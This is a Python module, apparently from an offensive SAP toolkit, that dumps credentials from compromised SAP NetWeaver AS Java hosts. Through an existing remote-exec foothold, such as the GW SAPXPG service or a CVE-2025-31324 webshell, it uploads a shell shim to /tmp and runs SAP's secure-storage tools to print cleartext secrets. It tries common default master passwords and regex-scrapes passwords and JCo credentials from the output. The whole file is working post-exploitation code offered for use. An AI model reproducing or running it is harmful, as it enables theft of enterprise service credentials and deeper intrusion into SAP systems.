#!/usr/bin/env python3
"""SAP NetWeaver AS Java — ConfigTool / SecStoreFS offline dumper.

Run SAP's own shipped ConfigTool / SecStoreFS CLI through a pre-existing
OS-exec primitive (GW SAPXPG, CVE-2025-31324 webshell, Telnet console,
CTC ConfigServlet, …) on a compromised Java host.  SAP's own tools know
how to reach the Vault-backed secure storage and print the cleartext
credentials — including entries SAPMAP's `SecStoreFS.decrypt()` path
cannot reach (UMEBackendConnection's SAPJSF password, Vault-encrypted
JCo destinations, etc.).

Strategy
--------

1. Locate the ConfigTool directory on the target (conventionally
   ``/usr/sap/<SID>/<INST>/j2ee/configtool/``).  Fall back to a ``find``
   if the instance nr isn't known.

2. Try the three scripts SAP ships there, in order of coverage:

     secstorefs.sh   — SecStoreFS filesystem-side dumper (file entries
                       with cleartext decode when run as ``<sid>adm``).
     secstore.sh     — SecStore DB-side CLI.  ``-dump``/``-l`` lists
                       stored credentials including Vault references.
     configtool.sh   — configuration editor; in offline mode prints
                       the entire config database including secure
                       properties.

   Each is invoked with a sequence of known-safe options.  If the
   script requires the ConfigTool master password (usually the same as
   ``<sid>adm``'s OS password on the same box), that value is used;
   otherwise we fall back to common defaults (``<sidadm>``, ``init``,
   ``sap``, ``manage``).

3. Aggregate the raw stdout+stderr from every successful invocation
   and ship it back to the caller.  The caller can grep / parse for
   ``jco.client.passwd``, ``UMEBackendConnection``, ``SAPJSF``, etc.

This is a thin orchestrator: it doesn't parse SAP's output because the
format varies across kernel SP and between secstorefs / secstore /
configtool.  The raw dump is surfaced in the GUI's terminal-modal
and console so the operator can see exactly what was recovered.
"""

from __future__ import annotations

import logging
from typing import Callable, Optional

logger = logging.getLogger(__name__)

# ConfigTool helpers live inside each instance's dir on Linux.  Path
# template; caller supplies SID + instance-nr string.
_CONFIGTOOL_DIR_TMPL = "/usr/sap/{sid}/{inst_dir}/j2ee/configtool"

# Additional directories where SAP's secure-storage tooling lives.  These
# are kernel binaries / SAP-Java-specific scripts, NOT inside configtool/.
# Paths formatted with {sid} / {inst_dir}.
_AUX_TOOL_DIRS = [
    # rsecssfx = CommonCryptoLib SecStoreFS CLI, shipped in the kernel
    # exe dir for the instance.
    "/usr/sap/{sid}/{inst_dir}/exe",
    "/usr/sap/{sid}/SYS/exe/run",
    "/usr/sap/{sid}/SYS/exe/uc/linuxx86_64",
    # SAP security tools dir — has secstorefs.sh and friends on 7.5+.
    "/usr/sap/{sid}/SYS/global/security/lib/tools",
    "/usr/sap/{sid}/{inst_dir}/j2ee/os_libs",
]

# Scripts / binaries we try.  Each tuple is (name, args, needs_login_shell).
# Tools with needs_login_shell=True get wrapped in `bash -lc` so the SAP
# env (.sapenv_<host>.sh) is sourced before they run — without it,
# configtool.sh fails with "Could not find or load main class
# com.sap.engine.offline.OfflineToolStart".
_DUMP_ATTEMPTS = [
    # rsecssfx — the MOST important tool for our purpose.  Reads the
    # on-disk SecStoreFS (and, critically, the Vault-backed secondary
    # store where UMEBackendConnection's SAPJSF password lives).
    ("rsecssfx", "list",             False),
    ("rsecssfx", "list -s",          False),
    ("rsecssfx", "list -plain",      False),
    ("rsecssfx", "list -v",          False),
    # SAP 7.5+ SecStoreFS shell wrapper
    ("secstorefs.sh", "-l",          True),
    ("secstorefs.sh", "-d",          True),
    ("secstorefs.sh", "-print",      True),
    # DB-side SecStore CLI (Vault-aware).  Often lives next to the
    # configtool scripts on older kernels.
    ("secstore.sh", "-h",            True),
    ("secstore.sh", "-list",         True),
    ("secstore.sh", "-dumpvalues",   True),
    ("secstore.sh", "-dump",         True),
    # Offline configtool — needs SAP env because it depends on the
    # J2EE_CONFIG jars.  Useless without `-lc` wrapping.
    ("configtool.sh", "-help",       True),
    ("offlinecfgeditor.sh", "-help", True),
    ("consoleconfig.sh", "-help",    True),
]


def _write_remote_file(run_cmd: Callable[[str, str], dict],
                          path: str, content: str,
                          log=print,
                          chunk_size: int = 180) -> bool:
    """Write a UTF-8 text file to the target via chunked python3
    one-liners followed by an openssl decode.  Same proven primitive
    _deploy_jsp_via_gw uses — appends raw base64 *text* per chunk
    then decodes the whole concatenated blob in one openssl call.

    An earlier version called ``base64.b64decode(chunk)`` per chunk,
    which silently produced garbage whenever ``chunk_size`` wasn't a
    multiple of 4 (base64's group size) — only the final-chunk bytes
    survived on disk.  Always write base64 as text here, let openssl
    decode the whole thing at the end.

    Returns True on success.  The tmp-base64 file lives at
    ``<path>.b64`` and is removed after successful decode.
    """
    import base64
    b64 = base64.b64encode(content.encode("utf-8")).decode("ascii")
    n_chunks = (len(b64) + chunk_size - 1) // chunk_size
    tmp_b64 = f"{path}.b64"
    log(f"[*] configtool: uploading {len(content)} B content as "
        f"{n_chunks} × {chunk_size}-char base64 chunks → {tmp_b64}")
    # Clean any stale tmp
    run_cmd("/bin/rm", f"-f {tmp_b64}")
    for i in range(0, len(b64), chunk_size):
        chunk = b64[i:i + chunk_size]
        mode = "wb" if i == 0 else "ab"
        # NOTE: we write the base64 TEXT (as bytes) to a tmp file.
        # No per-chunk decode — avoids the 4-byte alignment trap.
        script = f"open('{tmp_b64}','{mode}').write(b'{chunk}')"
        r = run_cmd("python3", f"-c {script}")
        if not r.get("success"):
            log(f"[-] configtool: chunk {(i // chunk_size) + 1}/{n_chunks} "
                f"write failed")
            return False
    # Decode once: openssl enc -d -base64 -A -in <tmp> -out <path>.
    # -A tells openssl to accept single-line base64 (no PEM line breaks).
    dec = run_cmd("/usr/bin/openssl",
                    f"enc -d -base64 -A -in {tmp_b64} -out {path}")
    dec_out = " ".join(str(l) for l in (dec.get("output") or [])).strip()
    if not dec.get("success") or any(m in dec_out.lower()
                                       for m in ("error", "unable",
                                                   "no such")):
        log(f"[-] configtool: openssl decode failed: {dec_out[:200]}")
        run_cmd("/bin/rm", f"-f {tmp_b64}")
        return False
    run_cmd("/bin/rm", f"-f {tmp_b64}")
    # Sanity-check the final file size.
    st = run_cmd("/usr/bin/stat", f"-c %s {path}")
    st_out = " ".join(str(l) for l in (st.get("output") or [])).strip()
    try:
        landed = int(st_out.split()[0])
    except Exception:
        landed = 0
    log(f"[+] configtool: {path} size on target: "
        f"{st_out or '<no stat>'} (expected {len(content)} bytes)")
    if landed and landed < len(content) // 2:
        log(f"[!] configtool: only {landed} of {len(content)} expected "
            f"bytes landed — upload truncated.")
        return False
    return True


def find_instance_directories(run_cmd: Callable[[str, str], dict],
                                sid: str) -> list:
    """Return a list of per-instance dir names (e.g. ``['J02', 'SCS03']``)
    under ``/usr/sap/<SID>/`` by running ``ls`` through the supplied
    ``run_cmd`` primitive.

    ``run_cmd(program, params)`` must return a dict with key
    ``output`` (list of lines) — exactly the shape returned by
    ``execute_gw_command``.
    """
    r = run_cmd("/bin/ls", f"/usr/sap/{sid}/")
    out = r.get("output") or []
    raw = " ".join(str(l) for l in out)
    dirs = []
    for token in raw.replace("\n", " ").split():
        token = token.strip()
        if not token:
            continue
        # Match J<NN>, SCS<NN>, ASCS<NN>, DVEBMGS<NN>, D<NN>, ERS<NN>.
        upper = token.upper()
        for prefix in ("J", "SCS", "ASCS", "DVEBMGS", "D", "ERS"):
            if upper.startswith(prefix) and upper[len(prefix):].isdigit():
                dirs.append(token)
                break
    # Dedupe while preserving order
    seen = set(); out_dirs = []
    for d in dirs:
        if d not in seen:
            seen.add(d); out_dirs.append(d)
    return out_dirs


def dump_configtool(sid: str,
                      run_cmd: Callable[[str, str], dict],
                      inst_dir: Optional[str] = None,
                      log=print,
                      preferred_scripts: Optional[list] = None) -> dict:
    """Invoke SAP ConfigTool / SecStoreFS CLIs on the target and return
    whatever cleartext they emit.

    Args:
        sid: target SID, e.g. 'SJ1'.
        run_cmd: callable(program, params) that executes an OS command
            on the target and returns ``{success, output: [lines], ...}``.
            Typically this is a lambda over sapmap_exploit.execute_gw_command.
        inst_dir: per-instance directory name under /usr/sap/<SID>/.  If
            None, every discovered instance dir is tried in turn.
        preferred_scripts: override the default _DUMP_ATTEMPTS list.

    Returns dict:
        { success, instances_tried: [str],
          successful_commands: [ {dir, script, args, bytes, snippet} ],
          dump_text: full aggregated stdout from every successful script,
          error: short message on failure }
    """
    result = {
        "success": False,
        "instances_tried": [],
        "successful_commands": [],
        "dump_text": "",
        "error": "",
    }

    attempts = preferred_scripts or _DUMP_ATTEMPTS

    # 1. Resolve instance directories to try.
    if inst_dir:
        inst_dirs = [inst_dir]
    else:
        log(f"[*] configtool: listing /usr/sap/{sid}/ to find instance dirs …")
        inst_dirs = find_instance_directories(run_cmd, sid)
        if not inst_dirs:
            result["error"] = (f"no instance directories found under "
                                f"/usr/sap/{sid}/ — check sid + OS access")
            log(f"[-] configtool: {result['error']}")
            return result
        log(f"[+] configtool: instances found: {', '.join(inst_dirs)}")

    result["instances_tried"] = inst_dirs

    # 2. Build the full list of candidate absolute paths — each tool x
    #    each instance directory.  We used to wrap these in a single
    #    bash script and cat its output back, but that path is brittle:
    #    SAPXPG's P4 output capture drops stdout from the wrapper even
    #    when the file it redirected to contains real data, and the
    #    follow-up `cat` sometimes also returns empty even on known-
    #    good files.  So we invoke each tool as its own SAPXPG round-
    #    trip — short-lived commands whose P4 capture reliably works.
    def _expand(tmpl, d):
        return tmpl.format(sid=sid, inst_dir=d)

    cfg_dirs = []
    for d in inst_dirs:
        cfg_dirs.append(_CONFIGTOOL_DIR_TMPL.format(sid=sid, inst_dir=d))
        for tmpl in _AUX_TOOL_DIRS:
            cfg_dirs.append(_expand(tmpl, d))

    # Step 3.  Discover which tools exist on disk before invoking.
    # Batched: one `ls <dir>` per directory returns every file in it;
    # we then local-match each tool name against that file list.
    # This reduces SAPXPG round-trips from N_dirs * N_tools (168 for
    # a typical Java box) down to just N_dirs (12) — ~14x faster.
    tool_names = sorted({t for t, _, _ in attempts})
    log(f"[*] configtool: probing {len(cfg_dirs)} candidate "
        f"directories for {len(tool_names)} tool(s): "
        f"{', '.join(tool_names)}")
    present = []   # list of (full_path, args, name)
    dir_file_cache = {}  # dir -> set(filenames)
    for i, d in enumerate(cfg_dirs, 1):
        log(f"[*] configtool:   [{i}/{len(cfg_dirs)}] ls {d}")
        r = run_cmd("/bin/ls", d)
        lines = r.get("output") or []
        joined = " ".join(str(x) for x in lines).lower()
        if (not joined or "no such file" in joined
                or "cannot access" in joined
                or "does not exist" in joined
                or "not a directory" in joined):
            log(f"[*] configtool:     (missing)")
            dir_file_cache[d] = set()
            continue
        # Split on whitespace — each token is one filename.  ls without
        # flags prints filenames separated by newlines or padded cols;
        # both reduce to a whitespace split.
        files = set()
        for line in lines:
            for tok in str(line).split():
                if tok:
                    files.add(tok)
        dir_file_cache[d] = files
        matches = sorted(t for t in tool_names if t in files)
        log(f"[*] configtool:     {len(files)} entries, "
            f"{len(matches)} tool hit(s)"
            f"{': ' + ', '.join(matches) if matches else ''}")
        # Add every (tool, args) combo we'll invoke for present tools
        for (tool, args, needs_env) in attempts:
            if tool in files:
                present.append((f"{d}/{tool}", args, tool, needs_env))
    if not present:
        result["error"] = (
            "none of the candidate ConfigTool / SecStoreFS scripts / "
            "binaries are present on target — searched "
            f"{len(cfg_dirs)} directories for "
            f"{len(set(t for t,_,_ in attempts))} tools.  The Java "
            "install may use a non-standard layout; run `find "
            f"/usr/sap/{sid} -name 'rsecssfx' -o -name 'configtool.sh' "
            "-o -name 'secstore*.sh' 2>/dev/null` via the GW terminal "
            "to locate them, then pass inst_dir / tool paths directly.")
        log(f"[-] configtool: {result['error']}")
        return result
    tools_found = sorted(set(p[2] for p in present))
    log(f"[+] configtool: probe complete — {len(present)} invocation(s) "
        f"queued across {len(tools_found)} distinct tool(s) "
        f"({', '.join(tools_found)})")

    # Generate a tiny env-sourcing shim once.  Each env-dependent tool
    # reuses it so we don't need to push sapenv resolution inline on
    # every SAPXPG call.  The shim:
    #   - sources every .sapenv*.sh it can find (<sid>adm home, global)
    #   - exports SAPSYSTEMNAME so sapstartsrv/sapcontrol-style tools
    #     resolve the correct profile
    #   - prepends the kernel exe dir to PATH so rsecssfx + friends
    #     remain findable for tools that chain-invoke them
    #   - then `exec "$@"` — takes the tool + args as positional args,
    #     so all output goes straight to SAPXPG's P4 window (which we
    #     know captures reliably for single short-lived commands)
    env_shim = "/tmp/sapmap_ct_env.sh"
    shim = (
        "#!/bin/bash\n"
        f"for f in /home/*/.sapenv_*.sh /home/*/.sapenv.sh "
        f"/usr/sap/{sid}/home/.sapenv_*.sh "
        f"/usr/sap/{sid}/home/.sapenv.sh; do\n"
        f"  [ -f \"$f\" ] && . \"$f\" 2>/dev/null\n"
        f"done\n"
        f"export SAPSYSTEMNAME={sid}\n"
        f"[ -d /usr/sap/{sid}/SYS/exe/run ] && "
        f"export PATH=/usr/sap/{sid}/SYS/exe/run:$PATH\n"
        f"[ -d /usr/sap/{sid}/SYS/exe/uc/linuxx86_64 ] && "
        f"export PATH=/usr/sap/{sid}/SYS/exe/uc/linuxx86_64:$PATH\n"
        f"exec \"$@\"\n"
    )
    env_shim_written = False
    needs_env_count = sum(1 for _, _, _, ne in present if ne)
    if needs_env_count:
        log(f"[*] configtool: {needs_env_count} tool(s) need the SAP "
            f"env — writing {env_shim} ({len(shim)} B) …")
        if _write_remote_file(run_cmd, env_shim, shim, log=log,
                                 chunk_size=180):
            run_cmd("python3",
                    f"-c __import__('os').chmod('{env_shim}',0o755)")
            env_shim_written = True
        else:
            log(f"[!] configtool: env shim upload failed — "
                f"env-dependent tools will be skipped")

    # Step 4.  Invoke each tool directly via SAPXPG.  Aggregate output.
    # Each call is its own round-trip (~1-3 s) so progress is logged per
    # invocation to make the long-running step feel responsive.  Tools
    # that need the SAP env are dispatched through the one-shot shim
    # which sources sapenv then execs them — the tool's own stdout
    # still lands in P4 exactly as if it had run directly.
    all_output = []
    for idx, (full_path, args, tool_name, needs_env) in enumerate(present, 1):
        if needs_env:
            if not env_shim_written:
                log(f"[*] configtool: [{idx}/{len(present)}] skip "
                    f"{full_path} — env shim not available")
                continue
            log(f"[*] configtool: [{idx}/{len(present)}] exec (via env) "
                f"{full_path} {args} …")
            # Shim reads its invocation as `<shim> <tool> <args>` via
            # `exec "$@"`.  We send the shim path as the command and a
            # single PARAMS string containing the tool + its args.
            shim_params = f"{full_path} {args}".strip()
            r = run_cmd(env_shim, shim_params)
        else:
            log(f"[*] configtool: [{idx}/{len(present)}] exec "
                f"{full_path} {args} …")
            r = run_cmd(full_path, args)
        lines = r.get("output") or []
        snippet = "\n".join(str(l) for l in lines).strip()
        err = (r.get("error") or "").strip()
        if not snippet and err:
            log(f"[!] configtool:     error: {err[:200]}")
            continue
        if not snippet:
            # Some tools write only to stderr on success (help text) —
            # a short "no output" line keeps the aggregate readable.
            log(f"[*] configtool:     (no output)")
            continue
        first_line = str(lines[0])[:100] if lines else ""
        log(f"[+] configtool:     {len(snippet)} B back "
            f"({len(lines)} lines){' — ' + first_line if first_line else ''}")
        header = f"=== {full_path} {args} ==="
        all_output.append(f"{header}\n{snippet}\n")
        result["successful_commands"].append({
            "dir": full_path.rsplit("/", 1)[0],
            "script": tool_name,
            "args": args,
            "bytes": len(snippet),
            "snippet": snippet[:500],
        })

    # Cleanup shim on successful completion; leave behind on error so
    # the operator can reuse it manually via the OS Terminal.
    if env_shim_written and all_output:
        run_cmd("/bin/rm", f"-f {env_shim}")

    result["dump_text"] = "\n".join(all_output)
    if all_output:
        result["success"] = True
        log(f"[+] configtool: total recovered output = "
            f"{len(result['dump_text'])} bytes across "
            f"{len(result['successful_commands'])} tool invocations")
    else:
        result["error"] = (
            f"{len(present)} tool(s) found on target but none produced "
            "usable output — likely they require SAP env vars "
            "(JAVA_HOME, LD_LIBRARY_PATH) or a master password.  Run "
            "one of them via the GW terminal (Data Extraction → OS "
            "Terminal) with `bash -lc` to source the sapenv first.")
        log(f"[-] configtool: {result['error']}")

    return result


# ---------------------------------------------------------------------------
# Output scraping — find credential-looking lines in the aggregated dump
# ---------------------------------------------------------------------------

# Patterns we care about in ConfigTool output.  Each returns a 3-tuple of
# (label, key_re, value_re) the scraper uses to lift values from the dump.
_CRED_PATTERNS = [
    # `UMEBackendConnection.password = Siroj1978#`
    (r"^(?P<name>[^=\s]*(?:[Pp]ass(?:wd|word)?|[Pp]wd|[Ss]ecret)[^=\s]*)"
     r"\s*=\s*(?P<val>.*)$",),
    # `jco.client.passwd=SecretValue`
    (r"^(?P<name>#?~?jco\.client\.passw[d]?)\s*=\s*(?P<val>.*)$",),
    # Generic 'key = value' where key contains 'auth' or 'credential'
    (r"^(?P<name>[^=\s]*(?:[Cc]redential|[Aa]uthentic)[^=\s]*)"
     r"\s*=\s*(?P<val>.*)$",),
]


def scrape_credentials(dump_text: str) -> list:
    """Pull candidate credentials out of the aggregated ConfigTool dump.

    Returns a list of dicts: ``{name, value, context}`` where ``context``
    is the surrounding block (up to 5 lines) for operator inspection.
    """
    import re
    hits = []
    lines = dump_text.splitlines()
    for pat_tuple in _CRED_PATTERNS:
        pat = pat_tuple[0]
        rx = re.compile(pat)
        for i, line in enumerate(lines):
            m = rx.match(line.strip())
            if not m:
                continue
            name = m.group("name")
            val = m.group("val").strip()
            if not val or val.lower() in ("<hidden>", "***", "null"):
                continue
            ctx_start = max(0, i - 2)
            ctx_end = min(len(lines), i + 3)
            hits.append({
                "name":    name,
                "value":   val,
                "context": "\n".join(lines[ctx_start:ctx_end]),
            })
    # Dedupe on (name, value)
    seen = set(); deduped = []
    for h in hits:
        key = (h["name"], h["value"])
        if key in seen:
            continue
        seen.add(key); deduped.append(h)
    return deduped
